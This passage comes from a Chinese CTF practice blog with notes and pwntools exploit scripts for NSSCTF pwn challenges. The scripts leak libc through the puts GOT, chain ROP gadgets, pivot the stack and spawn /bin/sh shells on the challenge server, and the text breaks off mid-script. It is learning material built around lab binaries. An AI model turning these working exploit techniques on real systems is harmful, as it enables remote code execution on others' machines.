class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>exe = ELF(<span class="hljs-string">&#x27;./attachment&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.DEBUG:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28203</span>)<br>        <br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;check youer money\n&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;How much do you exchange?&quot;</span>, <span class="hljs-string">&quot;100&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;check youer money\n&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span><br>    puts_plt = exe.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>    puts_got = exe.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>    main = exe.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>    ret_addr = <span class="hljs-number">0x0000000000400579</span><br>    pop_rdi_ret = <span class="hljs-number">0x0000000000400d73</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span> + <span class="hljs-built_in">hex</span>(puts_got))<br><br>    payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br><br>    <br>    preprocess()<br><br>    io.sendlineafter(<span class="hljs-string">&quot;You can name it!!!\n&quot;</span>, payload1)<br>    <span class="hljs-built_in">input</span> = io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>    log.info(<span class="hljs-built_in">input</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    puts_real_addr = u64(<span class="hljs-built_in">input</span>[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_real_addr: &quot;</span> )<br>    log.info(<span class="hljs-built_in">hex</span>(puts_real_addr))<br><br>    <span class="hljs-comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts_real_addr)</span><br>    libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>    sys = libc_base + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>    bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>    <span class="hljs-comment"># libc_base = puts_real_addr - libc.dump(&quot;puts&quot;)</span><br>    <span class="hljs-comment"># sys = libc_base + libc.dump(&quot;system&quot;)</span><br>    <span class="hljs-comment"># bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br>    <br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&#x27;libc_base: &#x27;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(libc_base))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&quot;sys: &quot;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(sys))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&quot;bin_sh: &quot;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(bin_sh))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    payload2 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys)<br><br>    preprocess()<br>    io.sendafter(<span class="hljs-string">&quot;You can name it!!!\n&quot;</span>, payload2) <br><br><br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br>    <br><br></code></pre></td></tr></table></figure><hr><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="/2024/10/29/hello-world/p/file-20250304203217854.png"><br>没有pie、canary<br>查ubuntu版本<br><img src="/2024/10/29/hello-world/p/file-20250304205824378.png"><br>先完成patchelf</p><p>发现用ropper找不到想要的gadgets<br><img src="/2024/10/29/hello-world/p/file-20250304211914149.png"></p><hr><blockquote><p>学习：<br>  flat([])函数<br>  strip()函数<br>  <a href="https://blog.csdn.net/smalosnail/article/details/53243758">一步一步学ROP之linux_x64篇_找不到 pop rdi-CSDN博客</a><br>  上面大佬文章写的很好</p></blockquote><hr><p><img src="/2024/10/29/hello-world/p/file-20250304223042800.png"><br>在libc中可以找到gadgets</p><p>然而 gadgets &#x3D;&gt; libc基地址 &#x3D;&gt; libc中的gadgets所以也没用<br>需要学习一些高级且细腻的操作</p><blockquote><p>参考：<br><a href="https://blog.csdn.net/weixin_44681716/article/details/89057022#:~:text=%E9%92%88%E5%AF%B9%E4%B8%80%E4%BA%9B%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%88%E5%A6%82%E5%8A%A0%E8%BD%BDlibc.so%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%89%EF%BC%8C%E6%8F%90%E5%8F%96%E4%B8%80%E4%BA%9B%E9%80%9A%E7%94%A8%E7%9A%84gadgets%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%9B%B4%E5%88%A9%E4%BA%8E%E6%88%91%E4%BB%AC%E7%BB%A7%E7%BB%ADROP%E6%93%8D%E4%BD%9C%E3%80%82">PWN入门之通用gadgets_gadgets pwn-CSDN博客</a></p></blockquote><hr><p>记录一下python版本<br><img src="/2024/10/29/hello-world/p/file-20250305113738168.png"><br>我的wsl中pip3和pip都指向python3.10这一个python版本<br><img src="/2024/10/29/hello-world/p/file-20250305113836755.png"><br>但可能安装了多个版本（如上4个<br><img src="/2024/10/29/hello-world/p/file-20250305114024121.png"><br>默认只能使用<code>python3</code>， 即 指向的是<code>python3.10</code>这个pip&#x2F;pip3所对应的版本</p><hr><p>我的pwntools解析不了<code>DEBUG</code>命令行参数问题：<br><img src="/2024/10/29/hello-world/p/file-20250305122455175.png"><br>TMD!直接换成别的参数名，如<code>GDB</code>就行了，我真是有点蠢了！（但是实测要大写！）<br>还以为是环境变量、vscode相关设置啥的，还折腾了半天环境变量、<code>set</code>，早知道先试下了<br>pwntools还是很强大的😭</p><hr><p>期间的折腾：<br><img src="/2024/10/29/hello-world/p/file-20250305122911008.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123022327.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123510340.png"></p><p>期间学到一招<br>设置环境变量要在命令前面<br><img src="/2024/10/29/hello-world/p/file-20250305123841997.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123820518.png"><br>在命令后面无效<br><img src="/2024/10/29/hello-world/p/file-20250305123906944.png"></p><hr><p>leave指令：<br>mov rsp rbp<br>&#x3D;&#x3D;pop rbp&#x3D;&#x3D;<br>实际上<br>rbp &#x3D; [rbp]<br>rsp &#x3D; rbp + 8</p><hr><p>做完下一题后又回来看一眼<br><img src="/2024/10/29/hello-world/p/file-20250306131055661.png"><br>还真是得从汇编中寻找gadgets呀<br>ret还是再传统的返回地址处<br><img src="/2024/10/29/hello-world/p/file-20250306131455494.png"></p><hr><p>&#x3D;&#x3D;注意！：<br>rsp里面存的是栈地址，并不是真正的栈内容！&#x3D;&#x3D;</p><hr><p>从上面看，<br>我们可以控制rax为栈顶地址<br>&#x3D;&gt; rdi为栈顶地址 &#x3D;&gt; 栈顶地址对应我们想要的字符串地址<br>搞了半天，发现我们无法直接修改rdi为想要的字符串地址<br>最多只能修改rdi为&#x3D;&#x3D;想要的字符串的地址的地址&#x3D;&#x3D;</p><p>这个方向貌似不太行</p><hr><p>我靠，哭了，<br>看了半天，以为字符串都是rodata<br>才发现是格式化字符串漏洞，程序逻辑还没看清就去找gadgets去了<br><img src="/2024/10/29/hello-world/p/file-20250306152643795.png"></p><p><img src="/2024/10/29/hello-world/p/file-20250306163522534.png"><br>覆盖栈内存后leave操作会破坏栈底<br>但是栈顶仍正常工作，分析后发现重点其实是rax<br><img src="/2024/10/29/hello-world/p/file-20250306163657629.png"><br>可结合这两块gadgets来使用<br>从</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rdi,rax<br>mov eax,0<br>call _printf<br></code></pre></td></tr></table></figure><p>开始使用<br>避免了栈底被破坏的问题</p><p>从打印format切换成了打印buf</p><p>实验1<br>0x7fffa5385960<br><img src="/2024/10/29/hello-world/p/file-20250306180353150.png"><br>0x7fffa53859a0<br><img src="/2024/10/29/hello-world/p/file-20250306180449965.png"><br>0x7fffa5385998<br><img src="/2024/10/29/hello-world/p/file-20250306180526187.png"></p><p>有个问题是leave操作后栈顶地址太高了<br>格式化字符串在它的更低地址处<br>无法打印格式化字符串</p><p>看一眼溢出和栈<br><img src="/2024/10/29/hello-world/p/file-20250307082439719.png"><br>发现是够的<br>printf()识别到<code>\x00</code>会停止输出<br><img src="/2024/10/29/hello-world/p/file-20250307090745548.png"><br>成功一半</p><p>call &#x3D; push ip+1 ; jmp</p><p>一般来说代码段可读可执行<br>data段和bss段可读可写不可执行<br>如果可执行，可直接写入shellcode并当作代码段执行，（又有地址<br>如果不可执行，可以考虑&#x3D;&#x3D;栈迁移&#x3D;&#x3D;<br>有数据段的地址，把数据段当作栈，把指令地址写到栈上</p><p>本地有一次失败：<br><img src="/2024/10/29/hello-world/p/file-20250307115238328.png"><br>远程打通<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>exe = ELF(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path], <span class="hljs-string">&quot;b *main&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># node2.anna.nssctf.cn:28348</span><br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28348</span>)<br><br><br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    offset = <span class="hljs-number">0x30</span> + <span class="hljs-number">8</span><br>    offset1 = <span class="hljs-number">0x20</span><br>    offset2 = <span class="hljs-number">2</span> + <span class="hljs-number">8</span><br>    puts_plt = exe.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>    puts_got = exe.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>    main = exe.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>    <span class="hljs-comment"># mov_rdi_rax = 0x00000000004011F0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span> , <span class="hljs-built_in">hex</span>(puts_got))<br>    call_puts = <span class="hljs-number">0x40124A</span><br>    call_printf = <span class="hljs-number">0x401227</span><br>    addr_ret = <span class="hljs-number">0x40101a</span><br>    addr_bss_rbp = <span class="hljs-number">0x404090</span><br>    <span class="hljs-comment"># payload = b&quot;AAAA%p%p&quot; + b&quot;%p&quot; * 0x17 + b&#x27;BB&#x27; + p64(call_printf)</span><br>    <br>    payload = <span class="hljs-string">b&#x27;%6$s%p%p&#x27;</span> + <span class="hljs-string">b&#x27;%p%p&#x27;</span> + <span class="hljs-string">b&#x27;%pAA&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span> + p64(addr_bss_rbp) + p64(call_printf) + p64(puts_got)<br>    io.recvuntil(<span class="hljs-string">&quot;show your magic\n&quot;</span>)<br>    io.sendline(payload)<br>    <span class="hljs-built_in">input</span> = io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>    log.info(<span class="hljs-built_in">input</span>)<br>    puts_real_addr = u64(<span class="hljs-built_in">input</span>[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    log.info(puts_real_addr)<br>    log.info(<span class="hljs-built_in">hex</span>(puts_real_addr))<br><br>    one_gadget = <span class="hljs-number">0xebc81</span><br>    libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>    one_real_gadget = libc_base + one_gadget<br>    log.info(<span class="hljs-built_in">hex</span>(libc_base))<br>    log.info(<span class="hljs-built_in">hex</span>(one_real_gadget))<br><br>    <span class="hljs-comment"># 栈迁移 -0x30</span><br>    offset = <span class="hljs-number">0x30</span><br>    addr_null = <span class="hljs-number">0x404090</span>+<span class="hljs-number">0x40</span><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * offset + p64(addr_null) +p64(one_real_gadget)<br><br>    io.sendlineafter(<span class="hljs-string">&quot;show your magic\n&quot;</span>, payload)<br><br>    <span class="hljs-comment"># 重新进入main</span><br>    <span class="hljs-comment"># 建立新栈帧</span><br>    <span class="hljs-comment"># payload = b&#x27;A&#x27; * offset + p64(one_real_gadget)</span><br>    <span class="hljs-comment"># io.sendlineafter(&quot;show your magic\n&quot;, payload)</span><br><br>    <span class="hljs-comment"># system_addr = libc_base + libc.symbols[&quot;system&quot;]</span><br>    <span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br>    <span class="hljs-comment"># io.sendlineafter(&quot;show your magic\n&quot;, payload)</span><br>    <span class="hljs-comment"># input = io.recvuntil(&quot;4242&quot;)</span><br>    <span class="hljs-comment"># print(input)</span><br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><hr><h1 id="真会布置栈吗？"><a href="#真会布置栈吗？" class="headerlink" title="真会布置栈吗？"></a>真会布置栈吗？</h1><p><img src="/2024/10/29/hello-world/p/file-20250305163849471.png"><br>64位小端<br>无canary<br>无pie<br>无NX</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><p>内核函数，将数据从缓冲区写入到文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sys_read</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><p>系统调用，将数据从文件描述符读入缓冲区</p><p>发现了一个伟大的gadgets<br><img src="/2024/10/29/hello-world/p/file-20250305171359152.png"><br>可以控制寄存器rdi、rsi、&#x3D;&#x3D;r13&#x3D;&#x3D;的值和程序的执行流程<br>可以将rdx清零控制程序的执行流程</p><p>syscall指令用于&#x3D;&#x3D;触发系统调用&#x3D;&#x3D;<br>syscall指令及其参数<br><img src="/2024/10/29/hello-world/p/file-20250305172317900.png"><br>在x86_64架构中，<br><code>syscall</code>指令相关的寄存器：</p><ul><li><code>rax</code> 系统调用号</li><li><code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、 <code>r9</code>：参数传递</li><li><code>rcx</code>：返回地址</li><li><code>r11</code>：标志寄存器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor rax,rax    ; 设置rax为0，sys_read<br>xor rdi,rdi    ; 设置rdi为0， fd 文件描述符<br>mov rsi,rsp    ; buf<br>mov edx,539<br>syscall        ; 可见这里是调用了sys_read<br></code></pre></td></tr></table></figure><p><code>execve</code>系统调用号为59<br>想要 syscall &#x3D;&gt; execve(‘&#x2F;bin&#x2F;sh’)<br>则syscall需要：</p><ul><li>rax：设置为59，表示execve</li><li>rdi：设置为&#x2F;bin&#x2F;sh的地址</li><li>rsi：参数列表的地址，可以设置为0</li><li>rdx：一般设置为0，表示环境变量为<code>NULL</code></li></ul><p>根据上面的gadgets，<br>我们可以控制rsi、rdi的值<br>且有syscall指令的地址</p><p>接下来的重点是控制rax的值<br><img src="/2024/10/29/hello-world/p/file-20250305175924282.png"><br>交换&#x3D;&#x3D;r13&#x3D;&#x3D;和rax的值，并跳转到rsp存的地址继续执行</p><p>这样就同时控制了rax,rdi,rsi,（rdx先不管（）</p><p>函数结束后跳到栈顶中地址，而非一般返回地址<br><img src="/2024/10/29/hello-world/p/file-20250305182007167.png"></p><p>这题还有一个点：<br>没有调用libc库函数！<br>无法泄漏libc</p><p>那就要改写一下内存中的数据了<br>这题没有main函数，都在_start函数里面</p><p>还有重量级信息：<br><img src="/2024/10/29/hello-world/p/file-20250305203751916.png"><br>该程序是静态链接<br>静态链接的程序，无法使用ret2libc来做！</p><p>测试1<br><img src="/2024/10/29/hello-world/p/file-20250305204510062.png"><br>测试2<br><img src="/2024/10/29/hello-world/p/file-20250305204615479.png"><br>每次栈的地址都是不同的</p><blockquote><p>[!faq] 栈的地址是如何分配的？<br>受什么影响？</p></blockquote><p>在gdb中栈地址是固定的</p><hr><p>需要修改data段<br>sys_read:<br>rax:0<br>rdi:0<br>rsi: addr_data<br>rdx: &gt;&#x3D;8</p><hr><p>本题有一个需要辨析的关键区别：<br>jmp [rsp]和ret的区别 ！！<br>jmp [rsp]仅仅是指令跳转 对栈没有操作<br>而ret有<br>ret操作必须是栈顶，是跳到栈顶处的地址，不断ret，栈顶元素会不断出栈，是动态的<br>而jmp则不是，jmp是静态的</p><p>ret &#x3D;&#x3D; jmp [rsp] + pop  &#x3D;&#x3D; pop rip<br>jmp [rsp] &#x3D;&#x3D; rip &#x3D; [rsp]</p><hr><p><img src="/2024/10/29/hello-world/p/file-20250305212710287.png"><br>即将jmp到ret<br>栈顶是ret<br>刚jmp到ret：<br><img src="/2024/10/29/hello-world/p/file-20250305212754630.png"><br>栈顶仍是ret</p><p>ret1次：<br>。。。</p><p>上面没管rdx，实际上rdx保留(0x539)<br>，足够大满足要求<br><img src="/2024/10/29/hello-world/p/file-20250305213541817.png"><br>成功拿到系统调用<br>并成功在<code>.data</code>段写入<br><img src="/2024/10/29/hello-world/p/file-20250305213716266.png"></p><hr><p><img src="/2024/10/29/hello-world/p/file-20250305220627758.png"><br>没有拿到shell<br>原因是envp未清零<br>需要清零<br>&#x3D;&gt; 需要将rdx清零<br><img src="/2024/10/29/hello-world/p/file-20250305220913857.png"><br><img src="/2024/10/29/hello-world/p/file-20250305220924277.png"><br><img src="/2024/10/29/hello-world/p/file-20250305220945311.png"><br><img src="/2024/10/29/hello-world/p/file-20250305221010974.png"></p><hr><p>清零后：<br><img src="/2024/10/29/hello-world/p/file-20250305221739587.png"><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&#x27;ZELLIJ&#x27;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>exe = ELF(<span class="hljs-string">&#x27;./attachment&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        <span class="hljs-comment"># io = process(&quot;./attachment&quot;)</span><br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        <span class="hljs-comment"># io = gdb.debug(&quot;./attachment&quot;, &quot;b *start&quot;)</span><br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># node2.anna.nssctf.cn:28379</span><br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28266</span>)<br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    pop_5 = <span class="hljs-number">0x401017</span>  <span class="hljs-comment"># rsi rdi rbx r13 r15</span><br>    xchg_rax_r13 = <span class="hljs-number">0x40100C</span><br>    addr_syscall = <span class="hljs-number">0x401077</span><br>    <span 